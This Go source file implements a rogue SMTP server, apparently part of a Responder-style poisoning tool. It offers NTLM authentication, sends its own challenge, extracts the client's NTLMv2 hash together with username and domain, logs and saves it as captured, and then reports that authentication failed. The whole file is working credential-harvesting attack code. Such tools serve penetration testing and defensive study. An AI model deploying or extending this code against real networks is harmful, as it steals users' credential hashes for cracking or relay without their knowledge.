package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"strings"
	"time"
)

func serveSMTP(ifaceIP net.IP) {
	ln, err := net.Listen("tcp4", fmt.Sprintf("%s:25", ifaceIP))
	if err != nil {
		logError("SMTP listen :25 — %v (need root?)", err)
		return
	}
	logInfo("SMTP listening on %s:25", ifaceIP)
	for {
		c, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleSMTP(c)
	}
}

func handleSMTP(c net.Conn) {
	defer c.Close()
	c.SetDeadline(time.Now().Add(60 * time.Second))

	challenge := getChallenge()
	w := bufio.NewWriter(c)
	r := bufio.NewReader(c)
	send := func(msg string) { fmt.Fprintf(w, "%s\r\n", msg); w.Flush() }

	send("220 " + sessionMachineName + " ESMTP")

	for {
		line, err := r.ReadString('\n')
		if err != nil {
			return
		}
		line = strings.TrimRight(line, "\r\n")
		upper := strings.ToUpper(line)

		switch {
		case strings.HasPrefix(upper, "EHLO") || strings.HasPrefix(upper, "HELO"):
			send("250-" + sessionMachineName)
			send("250-AUTH NTLM")
			send("250 AUTH NTLM")

		case upper == "AUTH NTLM" || strings.HasPrefix(upper, "AUTH NTLM "):
			var token string
			if strings.Contains(line, " ") {
				parts := strings.SplitN(line, " ", 3)
				if len(parts) == 3 {
					token = parts[2]
				}
			}
			if token == "" {
				send("334 ") // request token
				token, err = r.ReadString('\n')
				if err != nil {
					return
				}
				token = strings.TrimRight(token, "\r\n")
			}

			raw, err := base64.StdEncoding.DecodeString(token)
			if err != nil {
				send("535 5.7.8 Authentication failed")
				return
			}
			ntlm := FindNTLMSSP(raw)
			if len(ntlm) < 12 || ntlmMsgType(ntlm) != 1 {
				send("535 5.7.8 Authentication failed")
				return
			}
			logVerbose("SMTP NTLM Type1 from %s", c.RemoteAddr())
			ntlmChallenge := BuildNTLMChallenge(challenge, sessionDomain, sessionMachineName)
			send("334 " + base64.StdEncoding.EncodeToString(ntlmChallenge))

			type3Line, err := r.ReadString('\n')
			if err != nil {
				return
			}
			type3Line = strings.TrimRight(type3Line, "\r\n")
			raw3, _ := base64.StdEncoding.DecodeString(type3Line)
			ntlm3 := FindNTLMSSP(raw3)
			if len(ntlm3) >= 12 && ntlmMsgType(ntlm3) == 3 {
				hash, user, domain, err := ParseNTLMAuthenticate(ntlm3, challenge)
				if err == nil {
					logSuccess("[SMTP] NTLMv2 captured from %s", c.RemoteAddr())
					logSuccess("       %s\\%s", domain, user)
					logSuccess("       %s", hash)
					saveHash(hash)
				}
			}
			send("535 5.7.8 Authentication credentials invalid")
			return

		case upper == "QUIT":
			send("221 2.0.0 Bye")
			return

		default:
			send("502 Command not implemented")
		}
	}
}
